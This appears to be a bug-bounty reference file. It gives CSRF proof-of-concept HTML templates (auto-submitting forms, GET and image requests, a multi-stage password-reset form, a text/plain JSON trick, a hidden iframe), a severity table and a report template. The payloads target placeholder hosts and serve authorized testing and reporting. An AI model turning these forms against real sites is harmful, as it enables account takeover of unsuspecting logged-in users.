# PoC Templates, Severity Guidance, and Report Template

## Auto-submitting POST form (the standard PoC)

```html
<html>
  <body>
    <form action="https://target.com/account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Burp Suite's "Generate CSRF PoC" (right-click a request → Engagement tools) produces this automatically from a captured request, including correctly populating every parameter — use it as a starting point, then adjust for any of the bypass techniques in the other reference files (Content-Type, method, added stages).

## GET-based PoC (for SameSite=Lax-vulnerable or token-free GET endpoints)

```html
<script>
  document.location = 'https://target.com/account/change-email?email=attacker@evil.com';
</script>
```
or, for a passive/no-interaction variant where a top-level navigation isn't available or needed:
```html
<img src="https://target.com/account/unsubscribe?id=12345" style="display:none">
```
Note the `<img>` variant does **not** count as a top-level navigation, so it will NOT carry a `SameSite=Lax` cookie — only use it against endpoints with no SameSite restriction at all.

## Auto-submitting form with delayed/multi-stage submission

```html
<html>
  <body>
    <form id="f1" action="https://target.com/account/security-question" method="POST">
      <input type="hidden" name="answer" value="attackerknownanswer">
    </form>
    <form id="f2" action="https://target.com/account/reset-password" method="POST">
      <input type="hidden" name="security_answer" value="attackerknownanswer">
      <input type="hidden" name="new_password" value="AttackerPass123!">
    </form>
    <script>
      document.getElementById('f1').submit();
      setTimeout(() => document.getElementById('f2').submit(), 2000);
    </script>
  </body>
</html>
```

## JSON-body PoC avoiding preflight (Content-Type trick)

```html
<form action="https://target.com/api/account/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","extra":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```
This relies on the server's JSON parser being lenient about the declared `Content-Type` — see `samesite-and-request-tricks.md` for why this works and when it doesn't.

## Iframe delivery (when the action must be viewed, or for chaining with clickjacking)

```html
<iframe src="https://target.com/account/change-email?email=attacker@evil.com" style="display:none"></iframe>
```
For the clickjacking-chained variant (visible, positioned overlay rather than hidden), see `clickjacking-and-chaining.md`.

---

## Severity guidance by impact type

CSRF severity is driven almost entirely by *what action* you can force, not by which specific bypass technique defeated the defense — a trivial missing-token bug on a password-change endpoint outranks an elaborate multi-step bypass on a cosmetic setting.

| Impact | Typical severity | Notes |
|---|---|---|
| Email change (no current-password re-entry required) | Critical | Near-certain path to full account takeover via password reset |
| Password change (no current-password re-entry required) | Critical | Direct account takeover |
| MFA removal/disable | Critical | Removes the user's last line of defense |
| Admin action (role grant, user creation, permission change) | Critical–High | Depends on blast radius (one account vs. site-wide) |
| Financial transaction (transfer, purchase, billing change) | High–Critical | Depends on whether amount/recipient is attacker-controlled and capped |
| Security-question / recovery-info change | High | Usually a stepping stone to account takeover — report the chain, not just the change |
| Profile data change (name, address, bio) | Medium | Real but limited unless it enables further social engineering |
| Preference/setting toggle (notifications, theme, newsletter) | Low | State it plainly — don't inflate |
| Login CSRF (forces victim into attacker's account) alone | Low–Informational | Becomes Medium–High only when chained (see `clickjacking-and-chaining.md`) |
| Logout CSRF alone | Informational | Annoyance-level on its own; occasionally a building block for a chain |

## Full report template

```markdown
**Title**: CSRF in [exact endpoint] allows [actor] to [impact], bypassing [defense bypassed]

## Summary
2-3 plain sentences: the endpoint, what defense existed and how it was
defeated, and the resulting impact.

## Defenses Present and How Each Was Bypassed
- CSRF token: [present/absent — if present, exactly how it was defeated]
- SameSite: [attribute value observed — if a restriction existed, exactly
  how it was defeated]
- Referer/Origin validation: [present/absent — if present, exactly how
  it was defeated]

## Steps to Reproduce
1. Host the attached PoC HTML (e.g., on Burp's exploit server)
2. While logged into the target as the victim account, visit the PoC URL
3. Observe: [the resulting state change]

## Proof of Concept
Attach the working HTML PoC file. Include a screen recording if the
impact benefits from being seen (e.g., showing the account email change
and the subsequent login as the attacker).

## Impact
An attacker can [exact action] by getting a logged-in victim to visit a
single page, with [stated interaction requirement — none beyond the
visit / one click / a timing window]. This leads to [concrete
consequence, including any chain — e.g., "...which combined with the
standard password-reset flow gives full account takeover"].

## Suggested Fix
One or two sentences specific to this endpoint and the defense gap found
— e.g., "Validate the CSRF token server-side against the session on
every code path, including the error/re-render path" or "Set
SameSite=Strict and additionally require POST (not GET) for this action."

## Severity Assessment
[Critical/High/Medium/Low] — basis: [impact type from the table above]
```

### Tone notes

- Lead with the impact and the defense bypassed, not a CSRF tutorial — the triager already knows what CSRF is.
- Always attach the actual working PoC file, not just a description of what it would do.
- State plainly which defenses you checked and ruled out, even the ones that held — it shows thoroughness and pre-empts "but we have SameSite set" pushback.
- If the finding depends on a chain (clickjacking, CORS, a second forged request), make every link's individual proof visible, not just the final outcome.
- Keep it under ~600 words, consistent with the other skills in this set.
